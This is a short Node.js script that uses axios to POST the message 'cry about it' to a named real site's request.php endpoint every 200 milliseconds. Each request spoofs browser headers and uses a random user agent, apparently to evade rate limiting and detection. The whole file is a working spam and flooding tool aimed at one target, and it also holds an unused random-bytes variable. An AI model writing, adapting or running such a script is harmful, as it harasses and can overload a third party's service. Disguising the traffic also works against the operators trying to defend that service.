var axios = require('axios');
var randomua = require('random-ua');
const crypto = require('crypto');

const d = crypto.randomBytes(2000).toString()

setInterval(function() {
  axios({
    url: 'https://wanon.net/request.php',
    method: 'post',
    headers: {
      'authority': 'wanon.net',
      'pragma': 'no-cache',
      'cache-control': 'no-cache',
      'sec-ch-ua': '"Opera GX";v="83", "Chromium";v="97", ";Not A Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'upgrade-insecure-requests': '1',
      'origin': 'https://wanon.net',
      'content-type': 'application/x-www-form-urlencoded',
      'user-agent': randomua.generate(),
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-user': '?1',
      'sec-fetch-dest': 'document',
      'accept-language': 'en-US,en;q=0.9'
    },
    data: `msg=cry about it`,
  })
    .then(function(response) {
      console.log(response);
    })
    .catch(function(error) {
      console.log(error);
    });
}, 200)
